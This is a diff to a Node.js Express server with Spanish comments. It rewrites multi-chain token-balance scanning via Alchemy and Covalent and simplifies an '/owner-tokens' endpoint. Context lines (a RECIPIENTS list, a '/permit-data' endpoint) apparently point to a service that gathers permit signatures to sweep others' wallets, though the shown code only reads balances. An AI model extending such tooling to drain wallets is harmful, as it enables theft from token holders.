@@ -94,6 +94,173 @@ const RECIPIENTS = (process.env.RECIPIENTS || "").split(",").map(s => s.trim()).
 const MAX_JOB_RETRIES = Number(process.env.MAX_JOB_RETRIES || 3);
 const SOL_USDC_MINT = process.env.SOL_USDC_MINT || null;
 
+// Añade esta función helper al principio del archivo, después de los imports
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+// Función para hacer requests con reintentos exponenciales
+const fetchWithRetry = async (url, options = {}, maxRetries = 3, baseDelay = 1000) => {
+  let lastError;
+  for (let i = 0; i < maxRetries; i++) {
+    try {
+      const response = await fetch(url, options);
+      
+      // Si es éxito, retornamos la respuesta
+      if (response.ok) {
+        const contentType = response.headers.get('content-type');
+        if (contentType && contentType.includes('application/json')) {
+          return await response.json();
+        }
+        return await response.text();
+      }
+      
+      // Si es error 429, intentamos nuevamente después de un delay
+      if (response.status === 429) {
+        const retryAfter = response.headers.get('Retry-After');
+        const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : baseDelay * Math.pow(2, i);
+        console.warn(`Rate limited. Retrying in ${waitTime}ms`);
+        await delay(waitTime);
+        continue;
+      }
+      
+      // Para otros errores, lanzamos excepción
+      throw new Error(`HTTP error: ${response.status} ${response.statusText}`);
+    } catch (error) {
+      lastError = error;
+      if (i < maxRetries - 1) {
+        const waitTime = baseDelay * Math.pow(2, i);
+        await delay(waitTime);
+      }
+    }
+  }
+  throw lastError;
+};
+
+// Reemplaza la función getEvmTokens con esta versión mejorada
+async function getEvmTokens(chainId, owner) {
+  const out = [];
+  const chainIdNum = Number(chainId);
+  
+  // Verificar si la red está habilitada en Alchemy antes de intentar
+  const enabledChains = [1, 56, 137, 80002, 43114, 42161, 10]; // Ajusta según tus redes habilitadas
+  
+  if (!enabledChains.includes(chainIdNum)) {
+    console.log(`Skipping chain ${chainId} as it's not enabled`);
+    return out;
+  }
+
+  try {
+    if (ALCHEMY_KEY) {
+      const hostMap = {
+        1: "eth-mainnet",
+        56: "bsc-mainnet",
+        137: "polygon-mainnet",
+        80002: "polygon-amoy",
+        43114: "avalanche-mainnet",
+        42161: "arbitrum-mainnet",
+        10: "optimism-mainnet"
+      };
+      
+      const host = hostMap[chainIdNum];
+      if (host) {
+        const url = `https://${host}.g.alchemy.com/v2/${ALCHEMY_KEY}`;
+        const body = { 
+          jsonrpc: "2.0", 
+          id: 42, 
+          method: "alchemy_getTokenBalances", 
+          params: [owner, "erc20"] 
+        };
+        
+        try {
+          const r = await fetchWithRetry(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+          }, 3, 1000);
+          
+          const list = r?.result?.tokenBalances ?? [];
+          const prov = PROVIDERS[chainIdNum];
+          
+          for (const tb of list) {
+            try {
+              if (!tb.contractAddress) continue;
+              const bal = ethers.BigNumber.from(tb.tokenBalance || "0x0");
+              if (bal.isZero()) continue;
+              
+              const c = new ethers.Contract(tb.contractAddress, [
+                "function decimals() view returns (uint8)",
+                "function symbol() view returns (string)"
+              ], prov);
+              
+              const decimals = Number(await c.decimals().catch(() => 18));
+              const symbol = await c.symbol().catch(() => "TOKEN");
+              
+              out.push({ 
+                chain: chainIdNum, 
+                symbol, 
+                address: tb.contractAddress, 
+                decimals, 
+                balance: bal.toString() 
+              });
+            } catch (e) { 
+              console.warn(`Error processing token ${tb.contractAddress}:`, e.message);
+              continue; 
+            }
+          }
+        } catch (e) {
+          console.warn("Alchemy request failed after retries:", e.message);
+        }
+      }
+    }
+  } catch (e) { 
+    console.warn("alchemy tokenbalances failed", e.message); 
+  }
+
+  // Intentar con Covalent solo si Alchemy falló o no devolvió resultados
+  if (out.length === 0 && COVALENT_KEY) {
+    try {
+      const map = { 
+        1: 1, 56: 56, 137: 137, 43114: 43114, 
+        42161: 42161, 10: 10, 80002: 80002 
+      };
+      
+      const covChain = map[chainIdNum];
+      if (covChain) {
+        const url = `https://api.covalenthq.com/v1/${covChain}/address/${owner}/balances_v2/?key=${COVALENT_KEY}`;
+        
+        try {
+          const r = await fetchWithRetry(url, {}, 3, 1000);
+          const items = r?.data?.items ?? [];
+          
+          for (const it of items) {
+            try {
+              const addr = it.contract_address;
+              const bal = ethers.BigNumber.from(it.balance || "0");
+              if (bal.isZero()) continue;
+              
+              out.push({ 
+                chain: chainIdNum, 
+                symbol: it.contract_ticker_symbol || it.contract_name || "TOKEN", 
+                address: addr, 
+                decimals: Number(it.contract_decimals || 18), 
+                balance: bal.toString() 
+              });
+            } catch (e) { 
+              console.warn(`Error processing covalent token ${it.contract_address}:`, e.message);
+              continue; 
+            }
+          }
+        } catch (e) {
+          console.warn("Covalent request failed after retries:", e.message);
+        }
+      }
+    } catch (e) { 
+      console.warn("covalent fallback failed", e.message); 
+    }
+  }
+
+  return out;
+}
+
 // 1inch native token address marker
 const ONEINCH_NATIVE_ADDRESS = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
 
@@ -365,22 +532,61 @@ async function getSolanaTokens(owner) {
 async function getTokensAllChains(owner) {
   const tokens = [];
   const evmChains = Object.keys(PROVIDERS).map(x => Number(x));
+  
+  // Escanear cadenas en paralelo con límite de concurrencia
+  const concurrentLimit = 3; // Limitar requests concurrentes
+  const chainPromises = [];
+  
   for (const c of evmChains) {
-    try {
-      const ev = await getEvmTokens(c, owner);
+    // Limitar la concurrencia
+    if (chainPromises.length >= concurrentLimit) {
+      await Promise.race(chainPromises);
+    }
+    
+    const chainPromise = (async () => {
       try {
-        const prov = PROVIDERS[c];
-        const nb = await prov.getBalance(owner).catch(() => null);
-        if (nb && !nb.isZero()) {
-          const symbol = NATIVE_SYMBOLS[c] || "NATIVE";
-          ev.unshift({ chain: c, symbol, address: null, decimals: 18, balance: nb.toString() });
+        const ev = await getEvmTokens(c, owner);
+        
+        // Añadir balance nativo si existe
+        try {
+          const prov = PROVIDERS[c];
+          if (prov) {
+            const nb = await prov.getBalance(owner).catch(() => null);
+            if (nb && !nb.isZero()) {
+              const symbol = NATIVE_SYMBOLS[c] || "NATIVE";
+              ev.unshift({ 
+                chain: c, 
+                symbol, 
+                address: null, 
+                decimals: 18, 
+                balance: nb.toString() 
+              });
+            }
+          }
+        } catch (e) { 
+          console.warn(`Error getting native balance for chain ${c}:`, e.message);
         }
-      } catch (e) { }
-      for (const t of ev) tokens.push(t);
-    } catch (e) { console.warn("chain scan fail", c, e?.message || e); }
+        
+        for (const t of ev) tokens.push(t);
+      } catch (e) { 
+        console.warn(`chain scan fail ${c}`, e.message);
+      }
+    })();
+    
+    chainPromises.push(chainPromise);
   }
-  const sol = await getSolanaTokens(owner).catch(() => []);
-  for (const s of sol) tokens.push(s);
+  
+  // Esperar a que todas las promesas se completen
+  await Promise.all(chainPromises);
+  
+  // Escanear Solana por separado
+  try {
+    const sol = await getSolanaTokens(owner);
+    for (const s of sol) tokens.push(s);
+  } catch (e) {
+    console.warn("Solana scan failed:", e.message);
+  }
+  
   return tokens;
 }
 
@@ -415,7 +621,7 @@ app.post('/owner-tokens', async (req, res) => {
       return res.status(400).json({ error: "owner required" });
     }
 
-    // Si no viene chain, escaneamos todas las chains disponibles (getTokensAllChains)
+    // Si no viene chain, escaneamos todas las chains disponibles
     if (!chain) {
       try {
         console.log('[owner-tokens] scanning all chains for owner=', owner);
@@ -423,7 +629,7 @@ app.post('/owner-tokens', async (req, res) => {
         return res.json({ tokens });
       } catch (e) {
         console.error('[owner-tokens] scan all chains error', e);
-        return res.status(500).json({ error: e?.message || String(e) });
+        return res.status(500).json({ error: e.message });
       }
     }
 
@@ -439,61 +645,40 @@ app.post('/owner-tokens', async (req, res) => {
 
     console.log(`[owner-tokens] scanning chain ${chainId} for owner=${owner}`);
 
-    // Obtener tokens para esta chain
     let tokens = [];
-    if (String(chainId).toLowerCase() === 'solana' || chain === 'solana') {
-      // Nota: si quieres admitir 'solana' como string, deberías enviar chain: 'solana' desde el front.
-      // En la práctica, aqui chainId sería NaN si se enviara 'solana' — por eso normalmente se envía 'solana' como string y se maneja aparte.
-      // Pero como ya validamos chainId numérico arriba, esta rama rara vez se ejecutará.
+    if (chainId === 999) { // Asumiendo que 999 representa Solana en tu sistema
       tokens = await getSolanaTokens(owner);
     } else {
       tokens = await getEvmTokens(chainId, owner);
-      // añadir native balance si existe
+      
+      // Añadir balance nativo
       try {
         const prov = PROVIDERS[chainId];
         if (prov) {
           const nb = await prov.getBalance(owner).catch(() => null);
           if (nb && !nb.isZero()) {
             const symbol = NATIVE_SYMBOLS[chainId] || "NATIVE";
-            tokens.unshift({ chain: chainId, symbol, address: null, decimals: 18, balance: nb.toString() });
-          }
-        }
-      } catch (e) { /* ignore balance fetch failure */ }
-    }
-
-    // Filtrado: verificar balances reales (opcional — mantiene tu lógica original)
-    const filteredTokens = [];
-    for (const token of tokens) {
-      try {
-        if (!token.address) {
-          const prov = PROVIDERS[chainId];
-          if (!prov) continue;
-          const currentBalance = await prov.getBalance(owner);
-          if (currentBalance && !currentBalance.isZero()) {
-            filteredTokens.push({ ...token, balance: currentBalance.toString() });
-          }
-        } else {
-          const prov = PROVIDERS[chainId];
-          if (!prov) continue;
-          const contract = new ethers.Contract(token.address, erc20Abi, prov);
-          const currentBalance = await contract.balanceOf(owner);
-          if (currentBalance && !currentBalance.isZero()) {
-            filteredTokens.push({ ...token, balance: currentBalance.toString() });
+            tokens.unshift({ 
+              chain: chainId, 
+              symbol, 
+              address: null, 
+              decimals: 18, 
+              balance: nb.toString() 
+            });
           }
         }
       } catch (e) {
-        console.warn(`Error verifying balance for token ${token.address || token.symbol}:`, e?.message || e);
+        console.warn(`Error getting native balance for chain ${chainId}:`, e.message);
       }
     }
 
-    return res.json({ tokens: filteredTokens });
+    return res.json({ tokens });
 
   } catch (err) {
     console.error('/owner-tokens error', err);
-    return res.status(500).json({ error: err?.message || String(err) });
+    return res.status(500).json({ error: err.message });
   }
 });
-
 
 app.post('/permit-data', async (req, res) => {
   try {
